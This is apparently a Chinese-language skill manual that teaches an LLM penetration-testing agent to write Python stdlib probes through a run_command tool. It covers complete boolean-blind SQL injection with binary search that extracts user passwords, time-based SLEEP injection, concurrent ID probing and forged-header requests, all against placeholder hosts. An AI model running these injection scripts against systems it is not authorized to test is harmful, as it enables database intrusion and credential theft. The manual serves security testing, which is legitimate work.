---
name: tooling/python3
description: |
  python3 工具手册（通用脚本引擎）。教 LLM 如何在沙箱容器里写 Python PoC——循环 / 条件 /
  二分 / 并发 / hash / hmac / regex / urllib 等 curl 难表达的复杂逻辑。适用于任何漏洞类型
  （SQLi 盲注、SSRF 内网枚举、JWT 伪造、IDOR 批量探测、业务逻辑竞态等）。
  配合 run_command 工具使用，仅依赖 Python stdlib。
---

# python3 用法手册

容器内预装 python3（无 pip install 权限）——任何需要循环 / 条件 / 复杂逻辑的探针都用它。
仅可用 stdlib：`urllib.request / urllib.parse / json / time / re / hashlib / base64 / hmac / sys / os.environ`。

调用形态：`run_command(command="python3 -c '<source>'")`。短脚本走 -c 内联，长脚本走 here-doc
（`python3 <<'PY' ... PY`）。

> **容器 host 改写**：脚本里 URL 如果指向宿主机本地服务（user prompt 里 host 是 `127.0.0.1` / `localhost` / 私网 IP），改写成 `host.docker.internal:<port>`；公网/内网域名原样保留。详见 `tooling/sqlmap` 手册。

## 核心模板（必会三种）

### 1. 单次请求 + 解析关键字段

```python
import urllib.request as r, urllib.parse as p, json
url = "http://api.example.com/v1/query"
body = p.urlencode({"id": "1' AND 1=1-- -"}).encode()
req = r.Request(url, data=body, headers={"Cookie": "session=<token>"})
resp = r.urlopen(req, timeout=10)
text = resp.read().decode("utf-8", errors="replace")
print(f"status={resp.status} len={len(text)}")
print(text[:500])  # 关键片段
```

放进 `python3 -c "..."` 时整段引号要 escape。更简洁是用 here-doc：

```bash
python3 <<'PY'
import urllib.request as r, urllib.parse as p
# ...
PY
```

### 2. 布尔盲注二分查找（提取数据）

```python
import urllib.request as r

COOKIE = "session=<token>"
URL = "http://api.example.com/v1/products?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),%d,1))%s%d-- -"

def query(payload):
    req = r.Request(payload, headers={"Cookie": COOKIE})
    return len(r.urlopen(req, timeout=8).read())

# baseline 长度
base = query(URL % (1, "=", 0))  # 假命题
hit  = query(URL % (1, ">", 0))  # 真命题
print(f"base={base} hit={hit}")  # 显著差异 → 布尔注入坐实

# 二分查找首字节
def char_at(pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if query(URL % (pos, ">", mid)) == hit:
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

print("".join(char_at(i) for i in range(1, 16)))
```

### 3. 时间盲注（time-based）

```python
import urllib.request as r, time

COOKIE = "session=<token>"
def measure(payload_url):
    t0 = time.time()
    try:
        r.urlopen(r.Request(payload_url, headers={"Cookie": COOKIE}), timeout=15).read()
    except Exception:
        pass
    return time.time() - t0

t = measure("http://api.example.com/v1/products?id=1' AND IF(1=1, SLEEP(3), 0)-- -")
f = measure("http://api.example.com/v1/products?id=1' AND IF(1=2, SLEEP(3), 0)-- -")
print(f"true={t:.2f} false={f:.2f}")  # true≈3.X false<1 → time-based 坐实
```

## 关键 stdlib 速查

| 模块 | 用途 |
|---|---|
| `urllib.request` | HTTP 客户端（Request / urlopen） |
| `urllib.parse` | URL / query / form 编解码 |
| `json` | JSON 序列化 |
| `time` | 计时 + sleep |
| `re` | 正则提取响应关键字 |
| `hashlib` | MD5 / SHA-256 校验码 |
| `hmac` | HMAC 签名（绕签名校验时用） |
| `base64` | base64 编解码 |
| `socket` | 原生 TCP（fallback 到 nc 形态） |

## 实用片段

### 解析 JSON 响应

```python
import urllib.request as r, json
data = json.loads(r.urlopen("http://api.example.com/v1/api").read())
print(data["error"]["message"][:200])
```

### 并发探测（轻量）

```python
import urllib.request as ur, threading, time
results = []
def fetch(idx):
    t0 = time.time()
    try:
        body = ur.urlopen(f"http://api.example.com/v1/products?id={idx}", timeout=5).read()
        results.append((idx, len(body), round(time.time() - t0, 3)))
    except Exception as e:
        results.append((idx, -1, str(e)))

threads = [threading.Thread(target=fetch, args=(i,)) for i in range(1, 11)]
[t.start() for t in threads]
[t.join() for t in threads]
for r in sorted(results):
    print(r)
```

### 自定义 Header 批量探测

```python
import urllib.request as ur

def probe(payload_value):
    req = ur.Request("http://api.example.com/v1/query",
                     data=payload_value.encode(),
                     headers={
                       "Content-Type": "application/json",
                       "Authorization": "Bearer <token>",
                       "X-Forwarded-For": "127.0.0.1",
                     },
                     method="POST")
    return ur.urlopen(req, timeout=8).read()
```

## 实战示例

> 示例里的 host/path/cookie 都是占位；按 user prompt 里抓到的真实值套用。

### 示例 1：长度差分确认（布尔盲注）

```
run_command({
  "command": "python3 <<'PY'\nimport urllib.request as r\nC = {'Cookie': 'session=<token>'}\nT = len(r.urlopen(r.Request(\"http://api.example.com/v1/products?id=1'+AND+1%3D1--+\", headers=C)).read())\nF = len(r.urlopen(r.Request(\"http://api.example.com/v1/products?id=1'+AND+1%3D2--+\", headers=C)).read())\nprint(f'true_len={T} false_len={F} diff={abs(T-F)}')\nPY",
  "tag": "py3-bool-len",
  "timeout_seconds": 60
})
```

### 示例 2：时间盲注

```
run_command({
  "command": "python3 <<'PY'\nimport urllib.request as r, time\nC = {'Cookie': 'session=<token>'}\ndef m(u):\n    t0 = time.time()\n    try: r.urlopen(r.Request(u, headers=C), timeout=15).read()\n    except: pass\n    return time.time() - t0\nt = m(\"http://api.example.com/v1/products?id=1'+AND+IF(1%3D1,SLEEP(3),0)--+\")\nf = m(\"http://api.example.com/v1/products?id=1'+AND+IF(1%3D2,SLEEP(3),0)--+\")\nprint(f'true={t:.2f} false={f:.2f}')\nPY",
  "tag": "py3-time-blind",
  "timeout_seconds": 90
})
```

### 示例 3：从响应 regex 提取错误堆栈

```
run_command({
  "command": "python3 <<'PY'\nimport urllib.request as r, re\nbody = r.urlopen('http://api.example.com/v1/products?id=1%27').read().decode(errors='replace')\nm = re.search(r'(SQLException|sql syntax|pg_query|ORA-\\d+).{0,200}', body, re.IGNORECASE)\nprint('hit:' + m.group(0)[:200] if m else 'miss')\nPY",
  "tag": "py3-regex"
})
```

## 常见坑

1. **`python3 -c "..."` 引号地狱**：内层用 `'`、外层用 `"`。复杂脚本直接 `python3 <<'PY' ... PY`
2. **`urllib.request` 默认无超时**：必传 `timeout=N`，否则容器 timeout 才停
3. **错误退出码不为 0**：`urlopen` 4xx/5xx 会抛 `HTTPError`；用 `try / except` 兜，否则 stderr 满屏 traceback
4. **没有 requests / httpx**：容器只有 stdlib；要用第三方先在 pentools 镜像 Dockerfile 里加
5. **`hashlib.md5(...).hexdigest()` 默认 byte 输入**：`hashlib.md5(b"x").hexdigest()`
6. **避免持久化**：容器 --rm，写文件无意义；脚本里 print 出来即可
7. **here-doc 引号转义**：在 `python3 <<'PY' ... PY` 里 Python 字符串无需 escape；但若内层用 `<<EOF` 不带引号会做 shell 变量替换 → 用 `<<'PY'`（带单引号）
